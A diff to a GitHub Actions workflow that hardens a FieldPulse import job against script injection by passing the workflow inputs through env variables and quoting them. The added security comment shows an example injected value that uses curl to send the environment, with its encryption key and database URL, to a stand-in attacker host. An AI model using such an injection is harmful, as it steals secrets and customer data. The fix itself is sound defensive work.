@@ -61,14 +61,26 @@ jobs:
       - name: Install dependencies
         run: npm ci
 
+      # SECURITY: `phases` is attacker-controllable free text (any user who can
+      # dispatch this workflow). It MUST arrive through `env:` and be quoted in
+      # the shell. Interpolating `${{ inputs.phases }}` directly into `run:`
+      # expands it into the script BEFORE bash parses it, so a value like
+      # `invoices; curl attacker.example --data "$(env)"` executes with
+      # ENCRYPTION_KEY — the key that decrypts every customer's name, phone,
+      # email and address — plus the production DATABASE_URL in scope. This
+      # repo is public, so dispatch is broadly reachable. Same rule for
+      # FP_SYNC_ORG_ID: a repo variable is not a trust boundary.
       - name: Run FieldPulse full sweep
         env:
           DATABASE_URL: ${{ secrets.DATABASE_URL }}
           FIELDPULSE_API_KEY: ${{ secrets.FIELDPULSE_API_KEY }}
           ENCRYPTION_KEY: ${{ secrets.ENCRYPTION_KEY }}
+          ORG_ID: ${{ vars.FP_SYNC_ORG_ID }}
+          PHASES: ${{ inputs.phases }}
         run: |
+          set -euo pipefail
           npx tsx src/lib/integrations/fieldpulse/import/run-import.ts \
-            --org ${{ vars.FP_SYNC_ORG_ID }} \
-            --phase ${{ inputs.phases != '' && inputs.phases || 'technicians,customers,jobs,invoices,estimates,payments,assets,comments,locations,items,job-metrics' }} \
+            --org "$ORG_ID" \
+            --phase "${PHASES:-technicians,customers,jobs,invoices,estimates,payments,assets,comments,locations,items,job-metrics}" \
             --yes \
             --allow-prod
